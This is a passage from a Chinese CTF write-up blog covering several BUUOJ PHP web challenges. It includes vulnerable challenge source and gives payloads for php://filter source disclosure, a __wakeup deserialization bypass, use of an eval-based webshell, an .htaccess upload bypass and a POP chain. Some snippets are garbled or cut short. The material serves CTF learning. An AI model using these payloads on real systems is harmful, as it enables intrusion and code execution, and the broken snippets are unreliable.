class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>  <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);  <span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);  <span class="hljs-variable">$file</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];  <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strstr</span>(<span class="hljs-variable">$file</span>,<span class="hljs-string">&quot;../&quot;</span>)||<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$file</span>,<span class="hljs-string">&quot;tp&quot;</span>)||<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$file</span>,<span class="hljs-string">&quot;input&quot;</span>)||<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$file</span>,<span class="hljs-string">&quot;data&quot;</span>))<br>&#123;    <br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Oh no!&quot;</span>; <br>   <span class="hljs-keyword">exit</span>();  &#125; <br> <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>); <br><span class="hljs-comment">//flag放在了flag.php里?&gt;</span><br></code></pre></td></tr></table></figure><p>使用PHP伪协议对文件内容进行编码：&#x2F;secr3t.php?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php&#x3D;&#x3D;&gt;base64解码</p><h2 id="极客大挑战-2019-PHP（反序列化）"><a href="#极客大挑战-2019-PHP（反序列化）" class="headerlink" title="[极客大挑战 2019]PHP（反序列化）"></a>[极客大挑战 2019]PHP（反序列化）</h2><p>备份网站&#x3D;&#x3D;&gt;dirsezrch -u <a href="http://ae4f66fd-39d2-4ca2-93f2-e3b29093f58c.node5.buuoj.cn:81/==%3Ewww.zip%E6%96%87%E4%BB%B6(%E7%9B%B4%E6%8E%A5%E5%9C%A8url%E7%BD%91%E5%9D%80%E5%90%8E%E9%9D%A2%E6%8B%BC%E6%8E%A5%E5%B0%B1%E5%8F%AF%E4%BB%A5)">http://ae4f66fd-39d2-4ca2-93f2-e3b29093f58c.node5.buuoj.cn:81/==&gt;www.zip文件(直接在url网址后面拼接就可以)</a></p><p>文件夹源码挨个看</p><p>index.php<br><code>&lt;?php</code></p><p>  <code>include &#39;class.php&#39;;</code></p><p>  <code>$select = $_GET[&#39;select&#39;];</code></p><p>  <code>$res=unserialize(@$select);</code></p><p>  <code>?&gt;</code></p><p>class.php(经过删减)</p><p>&lt;<code>?php</code></p><p><code>include &#39;flag.php&#39;;</code></p><p><code>class Name&#123;</code></p><p>  <code>private $username = &#39;nonono&#39;;</code></p><p><code>private $password = &#39;yesyes&#39;;</code></p><p><code>public function __construct($username,$password)&#123;</code></p><p>​    <code>$this-&gt;username = $username;</code></p><p>​    <code>$this-&gt;password = $password; &#125;</code></p><p> <code>function __wakeup()&#123;</code></p><p>​    <code>$this-&gt;username = &#39;guest&#39;;</code></p><p>  <code>&#125;</code></p><p> <code>function __destruct()&#123;</code></p><p>​    <code>if ($this-&gt;password != 100) &#123;</code></p><p>​      <code>echo &quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;;</code></p><p>​      <code>echo &quot;You name is: &quot;;</code></p><p>​      <code>echo $this-&gt;username;echo &quot;&lt;/br&gt;&quot;;</code></p><p>​      <code>echo &quot;You password is: &quot;;</code></p><p>​      <code>echo $this-&gt;password;echo &quot;&lt;/br&gt;&quot;;</code></p><p>​      <code>die();</code></p><p>​    <code>&#125;</code></p><p>​    <code>if ($this-&gt;username === &#39;admin&#39;) &#123;</code></p><p>​      <code>global $flag;</code></p><p>​      <code>echo $flag;</code></p><p>​    <code>&#125;else&#123;</code></p><p>​      <code>echo &quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#39;t give you the flag!&quot;;</code></p><p>​      <code>die();</code></p><p>**在反序列化时，当前属性个数大于实际属性个数时，就会跳过__wakeup(),去执行___destruct<br>思路明确了</p><p>当password为100，username为admin时即可获得flag</p><p>故以get传参为跳板本地构造原始POC：</p><p>?select&#x3D;O:4:”Name”:2:{s:13:” Name username”;s:5:”admin”;s:13:” Name password”;s:3:100;}</p><p>?select&#x3D;O:4:”Name”:2:{s:13:” Name username”;s:5:”admin”;s:13:” Name password”;s:3:100;}<br>仍然不行  </p><p>可能空格没有被实体化  这里我们需要把空格写出来<br> 而空格的url编码是%00，下面构造我们的payload </p><p>?select&#x3D;O:4:”Name”:3 {s:14:”%00Name%00username”;s:5:”admin”;s:14:”%00Name%00password”;s:3:”100”;}</p><h2 id="极客大挑战-2019-Knife-一句话木马、代码执行"><a href="#极客大挑战-2019-Knife-一句话木马、代码执行" class="headerlink" title="[极客大挑战 2019]Knife(一句话木马、代码执行)"></a>[极客大挑战 2019]Knife(一句话木马、代码执行)</h2><h5 id="Way1（代码执行）"><a href="#Way1（代码执行）" class="headerlink" title="Way1（代码执行）"></a>Way1（代码执行）</h5><p>显示 eval($_POST[“Syc”]);<br>POST: Syc&#x3D;var_dump(scandir(‘&#x2F;‘));—查看源代码 发现flag</p><h5 id="Way2（蚁剑）"><a href="#Way2（蚁剑）" class="headerlink" title="Way2（蚁剑）"></a>Way2（蚁剑）</h5><p>复制URL 密码：Syc  找flag文件</p><h2 id="MRCTF2020-你传你🐎呢-上传木马-抓包改后缀-htaccess绕过"><a href="#MRCTF2020-你传你🐎呢-上传木马-抓包改后缀-htaccess绕过" class="headerlink" title="[MRCTF2020]你传你🐎呢(上传木马+抓包改后缀+.htaccess绕过)"></a>[MRCTF2020]你传你🐎呢(上传木马+抓包改后缀+.htaccess绕过)</h2><p>随便上传，有限制 尝试了php3,php5,ptml,空格绕过,都不行</p><p>先上次1.png   &#x2F;&#x2F;与后面的png文件名一致</p><p>尝试.htaccess</p><p>内容：<br>&lt;FilesMatch “1.png”&gt;<br>SetHandler application&#x2F;x-httpd-php<br></FilesMatch></p><p>抓包&#x3D;&#x3D;&gt;Content-Type: image&#x2F;png</p><p>复制网址：&#x2F;upload&#x2F;731ae4223a74740c27bb86b66c482220&#x2F;<strong>.htaccess</strong></p><p>改为&#x2F;upload&#x2F;731ae4223a74740c27bb86b66c482220&#x2F;<strong>1.png</strong></p><p>踩坑：<em>这里要把.htaccess改为1.png，因为密码cmd是对应的1.png</em></p><h2 id="极客大挑战-2019-BuyFlag（数组绕过长度限制）"><a href="#极客大挑战-2019-BuyFlag（数组绕过长度限制）" class="headerlink" title="[极客大挑战 2019]BuyFlag（数组绕过长度限制）"></a>[极客大挑战 2019]BuyFlag（数组绕过长度限制）</h2><p>If you want to buy the FLAG:<br>                                 You must be a student from CUIT!!!<br>                                 You must be answer the correct password!!!  </p><p>源代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;!--<br>~~~post money <span class="hljs-keyword">and</span> password~~~<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>])) &#123;<br><span class="hljs-variable">$password</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$password</span>)) &#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;password can&#x27;t be number&lt;/br&gt;&quot;</span>;<br>&#125;<span class="hljs-keyword">elseif</span> (<span class="hljs-variable">$password</span> == <span class="hljs-number">404</span>) &#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Password Right!&lt;/br&gt;&quot;</span>;<br></code></pre></td></tr></table></figure><p>password&#x3D;404a     绕过</p><p>查看HTTP 发现Cookie: user&#x3D;0     0改为1试试</p><p>显示：Pay for the flag!!!hacker!!!</p><p>突然想起来money还要够</p><p>password&#x3D;404a&amp;money&#x3D;100000000</p><p>显示 Nember lenth is too long</p><p>钱减少还不够</p><p>可以尝尝9e9  <strong>password&#x3D;404a&amp;money&#x3D;9e9</strong></p><p>还有一个比较常见的数组绕过    <strong>password&#x3D;404a&amp;money[]&#x3D;1</strong></p><h2 id="网鼎杯-2020-青龙组-AreUSerialz（反序列化）"><a href="#网鼎杯-2020-青龙组-AreUSerialz（反序列化）" class="headerlink" title="[网鼎杯 2020 青龙组]AreUSerialz（反序列化）"></a>[网鼎杯 2020 青龙组]AreUSerialz（反序列化）</h2><p>构造POP链</p><p>不使用题目中原有的各个字段的protect属性，因为这样会使得序列化后的字符串出现不可打印字符，而题目中的is_valid()函数又会检验输入的字符串中是否有不可打印字符，因此，我们这里把protect属性修改为public。</p><?phpclass FileHandler {  public $op=2;  public $filename="./flag.php";  public $content;  }$a=new FileHandler;$str1=serialize($a);echo $str1;?><p>O:11:”FileHandler”:3:{s:2:”op”;i:2;s:8:”filename”;s:10:”.&#x2F;flag.php”;s:7:”content”;N;}</p><p>payload： ?str&#x3D;O:11:”FileHandler”:3:{s:2:”op”;i:2;s:8:”filename”;s:10:”.&#x2F;flag.php”;s:7:”content”;N;}</p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
